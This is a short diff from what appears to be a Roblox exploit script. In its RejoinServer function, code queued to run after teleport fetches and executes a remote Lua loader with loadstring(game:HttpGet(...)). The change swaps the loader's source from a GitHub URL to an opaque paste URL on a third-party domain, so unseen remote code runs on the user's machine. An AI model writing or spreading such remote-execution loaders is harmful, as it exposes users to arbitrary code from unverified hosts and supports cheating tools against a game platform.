@@ -1532,7 +1532,7 @@ local function RejoinServer()
     if qot then
         pcall(function()
             qot([[
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/rivals-hash/idk/main/loader.lua?t=" .. tostring(os.time())))()
+                loadstring(game:HttpGet("https://pastebin.aurorax.site/raw/B5GKSA23"))()
             ]])
         end)
     end
